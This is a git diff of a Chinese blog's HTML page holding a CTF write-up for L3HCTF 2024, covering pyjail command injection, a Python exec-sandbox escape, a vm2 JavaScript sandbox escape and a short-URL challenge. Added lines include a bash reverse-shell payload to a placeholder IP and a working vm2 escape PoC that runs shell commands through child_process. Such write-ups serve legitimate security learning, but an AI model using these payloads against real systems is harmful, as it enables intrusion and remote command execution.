@@ -72,7 +72,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#intractable-problem-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">intractable problem (复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.1.</span> <span class="toc-text">非预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#escape-web-Unsolved"><span class="toc-number">2.2.</span> <span class="toc-text">escape-web (Unsolved)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#short-url-Unsolved"><span class="toc-number">2.3.</span> <span class="toc-text">short url (Unsolved)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">3.1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#End-of-Programming"><span class="toc-number">3.2.</span> <span class="toc-text">End_of_Programming</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#intractable-problem-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">intractable problem (复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Revenge-Unsolved"><span class="toc-number">2.1.2.</span> <span class="toc-text">Revenge (Unsolved)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#escape-web-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">escape-web (复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#short-url-Unsolved"><span class="toc-number">2.3.</span> <span class="toc-text">short url (Unsolved)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">3.1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#End-of-Programming"><span class="toc-number">3.2.</span> <span class="toc-text">End_of_Programming</span></a></li></ol></li></ol>
     </div>
   
         
@@ -275,7 +275,10 @@
 <p>S1uM4i的wp：<a target="_blank" rel="noopener" href="https://s1um4i-official.feishu.cn/docx/QeGGdeyuhoR6kuxCOj8c44wRnne">https://s1um4i-official.feishu.cn/docx/QeGGdeyuhoR6kuxCOj8c44wRnne</a></p>
 <span id="more"></span>
 
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="intractable-problem-复现"><a href="#intractable-problem-复现" class="headerlink" title="intractable problem (复现)"></a>intractable problem (复现)</h2><p>web.py</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="intractable-problem-复现"><a href="#intractable-problem-复现" class="headerlink" title="intractable problem (复现)"></a>intractable problem (复现)</h2><blockquote>
+<p>pyjail</p>
+</blockquote>
+<p>web.py</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
 <span class="token keyword">import</span> time
 <span class="token keyword">import</span> random
@@ -361,195 +364,100 @@ q<span class="token operator">=</span><span class="token builtin">int</span><spa
 <span class="token keyword">else</span><span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>稍微审一下我们就会发现，我们输的内容会被拼接到 codes 中</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>稍微审一下我们就会发现，我们输的内容会被拼接到上面的 codes 中</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">codes<span class="token operator">=</span><span class="token triple-quoted-string string">'''
 &lt;&lt;codehere>>
 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>明显能进行命令注入</p>
+<p>明显能直接进行命令注入</p>
+<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240207171223912.png" alt="image-20240207171223912"></p>
 <p>payload：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span><span class="token string">"def factorization(n: string) -> tuple[int]:\n\treturn flag'''\nos.system('bash -c \"bash -i >&amp; /dev/tcp/xxx.xxx.xxx.xxx/1234 0>&amp;1\"')\n'''"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span><span class="token string">"def factorization(n: string) -> tuple[int]:\n\treturn 1'''\nos.system('bash -c \"bash -i >&amp; /dev/tcp/xxx.xxx.xxx.xxx/14723 0>&amp;1\"')\n'''"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240207171001567.png" alt="image-20240207171001567"></p>
+<hr>
+<h3 id="Revenge-Unsolved"><a href="#Revenge-Unsolved" class="headerlink" title="Revenge (Unsolved)"></a>Revenge (Unsolved)</h3><p><del>理解不能</del></p>
+<p>先了解一下，下面这段代码能逃出exec布置的<code>&quot;__builtins__&quot;: None</code>环境，得到<code>__globals__</code>，从而获得builtins</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82">https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+g <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">,</span> gl<span class="token operator">:=</span>g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">)</span> <span class="token keyword">for</span> g <span class="token keyword">in</span> a<span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>g<span class="token punctuation">)</span>
+g<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>接下来是任意内存读写的部分，二进制先放着了</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md">https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md</a></p>
+<hr>
+<h2 id="escape-web-复现"><a href="#escape-web-复现" class="headerlink" title="escape-web (复现)"></a>escape-web (复现)</h2><p>热乎的洞：<a target="_blank" rel="noopener" href="https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9">https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9</a></p>
+<p>一个vm js沙盒</p>
+<p>自己做的时候用了一点没啥用的命令，随便记一下（</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>process<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>poc：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token constant">VM</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+async function fn() &#123;
+    (function stack() &#123;
+        new Error().stack;
+        stack();
+    &#125;)();
+&#125;
+p = fn();
+p.constructor = &#123;
+    [Symbol.species]: class FakePromise &#123;
+        constructor(executor) &#123;
+            executor(
+                (x) => x,
+                (err) => &#123; return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); &#125;
+            )
+        &#125;
+    &#125;
+&#125;;
+p.then();
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>题目环境不出网</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-sf</span> /flag /app/output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <hr>
-<h2 id="escape-web-Unsolved"><a href="#escape-web-Unsolved" class="headerlink" title="escape-web (Unsolved)"></a>escape-web (Unsolved)</h2><p>热乎的洞：<a target="_blank" rel="noopener" href="https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9">https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9</a></p>
-<p>一个js沙盒</p>
-<p>先看看用了什么模块</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="short-url-Unsolved"><a href="#short-url-Unsolved" class="headerlink" title="short url (Unsolved)"></a>short url (Unsolved)</h2><p>本地自己起docker环境起不来，摆了</p>
+<p>DemoApplication.class</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ResponseEntity<span class="token punctuation">.</span>BodyBuilder</span><span class="token punctuation">)</span><span class="token class-name">ResponseEntity</span><span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">FOUND</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">location</span><span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token string">"/index.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"redirect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-<pre class="line-numbers language-json" data-language="json"><code class="language-json">Function <span class="token punctuation">&#123;</span>
-  id<span class="token operator">:</span> 'vm.js'<span class="token punctuation">,</span>
-  filename<span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
-  path<span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
-  parent<span class="token operator">:</span> undefined<span class="token punctuation">,</span>
-  loaded<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
-  paths<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-  children<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-  exports<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/share"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token class-name">String</span> link<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+      <span class="token class-name">UriComponents</span> uri <span class="token operator">=</span> <span class="token class-name">UriComponentsBuilder</span><span class="token punctuation">.</span><span class="token function">fromUriString</span><span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token class-name">String</span> protocal <span class="token operator">=</span> uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>protocal<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+         <span class="token keyword">return</span> <span class="token string">"url is invalid"</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+         <span class="token class-name">String</span> shortURL <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GetShortURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token class-name">CacheMap</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>shortURL<span class="token punctuation">,</span> link<span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RedirectURL</span> <span class="token operator">+</span> shortURL<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+   <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">return</span> <span class="token string">"server error"</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-<p>再看看进程</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>process<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/jump"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">jump</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token class-name">String</span> redirect<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token class-name">CacheMap</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>redirect<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token keyword">return</span> url <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token class-name">ResponseEntity</span><span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">NOT_FOUND</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"url not found"</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ResponseEntity<span class="token punctuation">.</span>BodyBuilder</span><span class="token punctuation">)</span><span class="token class-name">ResponseEntity</span><span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">FOUND</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">location</span><span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
-  argv<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-  title<span class="token operator">:</span> 'node'<span class="token punctuation">,</span>
-  version<span class="token operator">:</span> 'v20.<span class="token number">11.0</span>'<span class="token punctuation">,</span>
-  versions<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
-    node<span class="token operator">:</span> '<span class="token number">20.11</span>.<span class="token number">0</span>'<span class="token punctuation">,</span>
-    acorn<span class="token operator">:</span> '<span class="token number">8.11</span>.<span class="token number">2</span>'<span class="token punctuation">,</span>
-    ada<span class="token operator">:</span> '<span class="token number">2.7</span>.<span class="token number">4</span>'<span class="token punctuation">,</span>
-    ares<span class="token operator">:</span> '<span class="token number">1.20</span>.<span class="token number">1</span>'<span class="token punctuation">,</span>
-    base64<span class="token operator">:</span> '<span class="token number">0.5</span>.<span class="token number">1</span>'<span class="token punctuation">,</span>
-    brotli<span class="token operator">:</span> '<span class="token number">1.0</span>.<span class="token number">9</span>'<span class="token punctuation">,</span>
-    cjs_module_lexer<span class="token operator">:</span> '<span class="token number">1.2</span>.<span class="token number">2</span>'<span class="token punctuation">,</span>
-    cldr<span class="token operator">:</span> '<span class="token number">43.1</span>'<span class="token punctuation">,</span>
-    icu<span class="token operator">:</span> '<span class="token number">73.2</span>'<span class="token punctuation">,</span>
-    llhttp<span class="token operator">:</span> '<span class="token number">8.1</span>.<span class="token number">1</span>'<span class="token punctuation">,</span>
-    modules<span class="token operator">:</span> '<span class="token number">115</span>'<span class="token punctuation">,</span>
-    napi<span class="token operator">:</span> '<span class="token number">9</span>'<span class="token punctuation">,</span>
-    nghttp2<span class="token operator">:</span> '<span class="token number">1.58</span>.<span class="token number">0</span>'<span class="token punctuation">,</span>
-    nghttp3<span class="token operator">:</span> '<span class="token number">0.7</span>.<span class="token number">0</span>'<span class="token punctuation">,</span>
-    ngtcp2<span class="token operator">:</span> '<span class="token number">0.8</span>.<span class="token number">1</span>'<span class="token punctuation">,</span>
-    openssl<span class="token operator">:</span> '<span class="token number">3.0</span>.<span class="token number">12</span>+quic'<span class="token punctuation">,</span>
-    simdutf<span class="token operator">:</span> '<span class="token number">4.0</span>.<span class="token number">4</span>'<span class="token punctuation">,</span>
-    tz<span class="token operator">:</span> '2023c'<span class="token punctuation">,</span>
-    undici<span class="token operator">:</span> '<span class="token number">5.27</span>.<span class="token number">2</span>'<span class="token punctuation">,</span>
-    unicode<span class="token operator">:</span> '<span class="token number">15.0</span>'<span class="token punctuation">,</span>
-    uv<span class="token operator">:</span> '<span class="token number">1.46</span>.<span class="token number">0</span>'<span class="token punctuation">,</span>
-    uvwasi<span class="token operator">:</span> '<span class="token number">0.0</span>.<span class="token number">19</span>'<span class="token punctuation">,</span>
-    v8<span class="token operator">:</span> '<span class="token number">11.3</span>.<span class="token number">244.8</span>-node.<span class="token number">17</span>'<span class="token punctuation">,</span>
-    zlib<span class="token operator">:</span> '<span class="token number">1.2</span>.<span class="token number">13.1</span>-motley-5daffc7'
-  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-  arch<span class="token operator">:</span> 'arm64'<span class="token punctuation">,</span>
-  platform<span class="token operator">:</span> 'linux'<span class="token punctuation">,</span>
-  env<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-  pid<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
-  features<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
-    inspector<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-    debug<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
-    uv<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-    ipv6<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-    tls_alpn<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-    tls_sni<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-    tls_ocsp<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-    tls<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-    cached_builtins<span class="token operator">:</span> <span class="token punctuation">[</span>Getter<span class="token punctuation">]</span>
-  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-  nextTick<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> nextTick<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  hrtime<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> hrtime<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  uptime<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> uptime<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  cwd<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> cwd<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  addListener<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> addListener<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  on<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> addListener<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  once<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> once<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  listeners<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> listeners<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  removeListener<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> removeListener<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  umask<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> umask<span class="token punctuation">]</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>看一下可以用的变量</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>
-  <span class="token string">'global'</span><span class="token punctuation">,</span>        <span class="token string">'Proxy'</span><span class="token punctuation">,</span>
-  <span class="token string">'Function'</span><span class="token punctuation">,</span>      <span class="token string">'eval'</span><span class="token punctuation">,</span>
-  <span class="token string">'setTimeout'</span><span class="token punctuation">,</span>    <span class="token string">'setInterval'</span><span class="token punctuation">,</span>
-  <span class="token string">'setImmediate'</span><span class="token punctuation">,</span>  <span class="token string">'clearTimeout'</span><span class="token punctuation">,</span>
-  <span class="token string">'clearInterval'</span><span class="token punctuation">,</span> <span class="token string">'clearImmediate'</span><span class="token punctuation">,</span>
-  <span class="token string">'process'</span><span class="token punctuation">,</span>       <span class="token string">'console'</span>
-<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>看一下全局对象</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-json" data-language="json"><code class="language-json">&lt;ref *<span class="token number">1</span>> <span class="token punctuation">&#123;</span>
-  global<span class="token operator">:</span> <span class="token punctuation">[</span>Circular *<span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-  Proxy<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> Proxy<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  Function<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> Function<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  eval<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> eval<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  setTimeout<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> setTimeout<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  setInterval<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> setInterval<span class="token punctuation">]</span><span class="token punctuation">,</span>
